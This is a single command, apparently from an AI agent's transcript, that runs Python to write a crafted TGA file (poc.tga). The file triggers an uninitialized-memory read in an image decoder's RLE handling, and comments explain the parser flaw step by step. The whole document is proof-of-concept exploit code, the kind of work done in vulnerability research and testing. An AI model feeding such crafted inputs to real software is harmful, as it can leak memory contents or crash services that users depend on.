Running command: python3 -c "
import struct

# Approach: Type 10 (RLE RGB), 1x1, 24-bit
# One raw packet header covering 1 pixel = 3 bytes
# No actual pixel data -> leaves image buffer uninitialized
# valid=true -> conversion loop reads uninitialized data

id_length = 0
colormap_type = 0
image_type = 10    # RLE RGB
colormap_index = 0
colormap_length = 0
colormap_size = 0
x_origin = 0
y_origin = 0
width = 1
height = 1
pixel_size = 24
flags = 0x20       # origin upper-left

header = struct.pack('<BBBHHBHHHHBB',
    id_length, colormap_type, image_type,
    colormap_index, colormap_length, colormap_size,
    x_origin, y_origin, width, height, pixel_size, flags)

# Raw packet: count=1 pixel, raw mode (bit 7=0)
# 0x00 means (0 & 0x7f) + 1 = 1 pixel
packet = bytes([0x00])

# No pixel data follows - readRawData will read 0 bytes
# num starts at 3, subtracts 1*3=3, becomes 0 -> loop exits -> valid=true
# Conversion loop reads 3 bytes from uninitialized malloc'd buffer

with open('/workspace/poc.tga', 'wb') as f:
    f.write(header + packet)
print(f'Written {len(header) + len(packet)} bytes')
"
